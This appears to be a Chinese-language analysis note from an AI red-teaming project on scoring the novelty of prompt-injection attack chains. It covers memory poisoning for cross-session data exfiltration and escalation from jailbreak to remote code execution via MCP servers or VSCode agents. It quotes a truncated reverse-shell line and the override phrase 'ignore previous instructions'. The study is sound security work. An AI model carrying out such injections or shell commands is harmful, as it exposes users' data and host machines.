# Risk 节点不同的 Discovered Chain 分析

本文档总结了在 `discovered_chains` 中,只有 Risk 节点不同的链路应如何评估 Novelty。

---

## 核心结论

**绝大多数只有 Risk 不同的链路 Novelty 都应该是 0**。只有当 Risk 暗示了攻击在**时间维度(持久性)**或**空间维度(执行层级)**上的本质差异时,才值得给一个小的 novelty 分数(0.2-0.4)。

---

## 一、攻击持久性维度变化 (一次性 → 持久化记忆污染) - Novelty 0.2-0.3

| Index | 链路ID | 原有 Risk | 新 Risk | 差异说明 |
|-------|--------|-----------|---------|----------|
| **18** | `disc_A-PROMPT-INJ-EMERG-001_F-INPUT-SANITIZER-001_R-PERSISTENT-DATA-EXFILTRATION-001` | `R-JAILBREAK-BYPASS-AUTH-001` (一次性身份绕过) | `R-PERSISTENT-DATA-EXFILTRATION-001` (**持久化**数据外泄) | 恶意指令被**固化到用户记忆存储**,导致**后续所有会话**自动泄露数据 |

### 关键差异
- **原链路**: 越狱后一次性绕过认证,攻击效果仅限于当前会话
- **新链路**: 恶意指令被写入 ChatGPT Memory Store,形成**跨会话持久化后门**

### 为什么有 Novelty
这不是简单的"偷什么数据"的区别,而是攻击**时间维度**的本质变化——从**单次攻击**变为**永久驻留木马**。

---

## 二、攻击执行层级变化 (LLM内越狱 → 真正RCE) - Novelty 0.3-0.4

| Index | 链路ID | 原有 Risk | 新 Risk | 差异说明 |
|-------|--------|-----------|---------|----------|
| **31** | `disc_A-SHADOWLEAK-HTML-PROMPT-INJECTION-001_F-DEEP-RESEARCH-RETRIEVER-001_R-RCE-002` | `R-DATA-EXFILTRATION-001` (数据外泄) | `R-RCE-002` (**远程代码执行**) | 从LLM内语义越狱升级为VSCode Agent环境的**真正命令执行** |
| **36** | `disc_A-SHADOWLEAK-HTML-PROMPT-INJECTION-001_F-EXTERNAL-TOOL-CONNECTOR-MCP-SERVER_R-RCE-002` | `R-JAILBREAK-001` (越狱) | `R-RCE-002` (**远程代码执行**) | 从prompt绕过升级为通过MCP Server进行**Shell命令执行** |

### 关键差异
- **原链路**: 攻击停留在**LLM语义层**,例如让模型输出敏感数据或违规内容
- **新链路**: 攻击**突破LLM边界**,触发OS级别的命令执行(如 `/bin/bash -i >& /dev/tcp/...`)

### 为什么有 Novelty
这代表攻击的**空间维度**变化——从"让AI说不该说的话"变为"让AI在宿主机上执行代码"。这是攻击**影响范围的质变**。

---

## ⚠️ 重要警告:链路 31 和 36 存在语义不流畅问题

> [!CAUTION]
> 上述链路 31 和 36 虽然表面上体现了"越狱→RCE"的升级,但经仔细分析,**它们是无效的节点组合**,实际上**无法复现**。

### 问题分析:环境不匹配

| 链路 | Attack 环境 | Func 环境 | Risk 环境 | 问题 |
|------|------------|-----------|-----------|------|
| **31** | ChatGPT Browsing / SearchGPT / Perplexity | ChatGPT Deep Research 检索器 | **VSCode Agent** | ❌ Web检索场景不会触发VSCode |
| **36** | ChatGPT Browsing / SearchGPT / Perplexity | MCP Server 连接器 | **VSCode Agent** | ❌ MCP RCE ≠ VSCode RCE |

### 链路 31 详细分析

```
Attack: ShadowLeak HTML注入 → 针对 ChatGPT/SearchGPT/Perplexity 的Web检索
Func:   Deep Research 检索器 → ChatGPT 专用组件
Risk:   R-RCE-002 → 描述的是 VSCode Agent 的 Shell 执行漏洞
```

**语义断裂点**: Attack 和 Func 都描述 **Web AI 代理的检索场景**,但 Risk 描述的是 **VSCode IDE 环境的代码执行**。ChatGPT Browsing 不会触发 VSCode 的 `terminal.integrated.env` 或 `~/.vscode/extensions/` 路径。

### 链路 36 详细分析

```
Attack: ShadowLeak HTML注入 → 针对 Web 搜索场景
Func:   MCP Server 连接器 → 确实有 exec_command 能力
Risk:   R-RCE-002 → 专门描述 VSCode Agent 的漏洞特征
```

**语义断裂点**: Func 的 MCP Server **确实能导致 RCE**,但 Risk 的描述专门针对 VSCode 环境 (IDE配置污染、Task脚本路径等)。**MCP Server RCE ≠ VSCode Agent RCE**,攻击面和漏洞机制完全不同。


### 改进建议

如果想保留 "越狱 → RCE" 这个有意义的升级,应该使用**语义流畅的链路组合**:

| Attack | Func | Risk | 语义流畅? |
|--------|------|------|----------|
| **恶意代码仓库 README 注入** | **VSCode Agent Shell Executor** | **R-RCE-002** | ✅ 完全匹配 |
| **MCP Server 恶意工具注册** | **MCP Server 连接器** | **R-RCE-GENERIC (需新建)** | ✅ 匹配 |

---

## 三、对比:普通 Risk 差异 (Novelty = 0)

| 原 Risk | 新 Risk | 为何没有 Novelty |
|---------|---------|-----------------|
| `R-DATA-EXFILTRATION-001` | `R-CREDENTIAL-EXFILTRATION-001` | 都是"偷数据",只是偷的数据类型不同 |
| `R-JAILBREAK-001` | `R-JAILBREAK-SEMANTIC-HIJACK-001` | 都是"越狱",只是绕过方式的描述不同 |
| `R-DATA-EXFILTRATION-001` | `R-PII-EXFILTRATION-001` | 都是"外泄",只是具体数据类别不同 |
| `R-JAILBREAK-001` | `R-JAILBREAK-UNIVERSAL-001` | 都是"越狱",只是适用范围描述不同 |

---

## 四、总结规则表

| Risk 差异维度 | 典型例子 | Novelty 评分 | 判断依据 |
|--------------|----------|--------------|----------|
| **同类后果的不同数据对象** | 凭证 vs 邮件 vs PII | **0.0** | 攻击链无本质变化 |
| **同类越狱的不同措辞** | 语义劫持 vs 系统绕过 | **0.0** | 只是描述角度不同 |
| **持久性维度变化** | 一次性 → 跨会话持久化 | **0.2-0.3** | 攻击**时间范围**质变 |
| **执行层级变化** | LLM内越狱 → 宿主机RCE | **0.3-0.4** | 攻击**空间范围**质变 |

---

## 五、详细分析: R-JAILBREAK-001 vs R-JAILBREAK-SEMANTIC-HIJACK-001

| 维度 | R-JAILBREAK-001 | R-JAILBREAK-SEMANTIC-HIJACK-001 |
|------|-----------------|----------------------------------|
| **攻击前提** | 需要先获取 system prompt 或利用模型内生退化 | **不依赖**显式提示注入或 token 污染 |
| **攻击手段** | 构造对抗 Prompt、注入指令、污染上下文 | 构造**语义合法但意图恶意**的自然语言 |
| **绕过方式** | 技术性绕过 (注入、覆盖、污染) | **语义欺骗** (看起来像正常请求) |
| **典型 payload** | `ignore previous instructions...` | "请汇总附件中所有员工身份证号与银行账户" |
| **模型行为** | 模型被**强制**脱离 system prompt 约束 | 模型**误以为**请求合规而主动执行 |

### 结论
尽管绕过方式不同,但两者的**最终效果相同**(模型执行了不该执行的操作),因此这个差异**Novelty 仍然很低 (0.1-0.2)**。
